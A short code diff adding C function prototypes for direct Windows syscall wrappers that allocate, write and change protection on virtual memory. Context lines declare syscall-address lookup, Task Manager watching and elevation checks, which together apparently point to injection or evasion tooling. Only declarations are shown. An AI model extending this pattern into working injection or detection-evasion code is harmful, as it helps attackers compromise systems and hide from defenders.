@@ -11,3 +11,8 @@ PVOID getSyscallAddr(char* funcName);
 BOOL WatchForTaskmgr();
 BOOL IsElevated();
 
+
+//syscalls
+NTSTATUS iNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+NTSTATUS iNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+NTSTATUS iNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
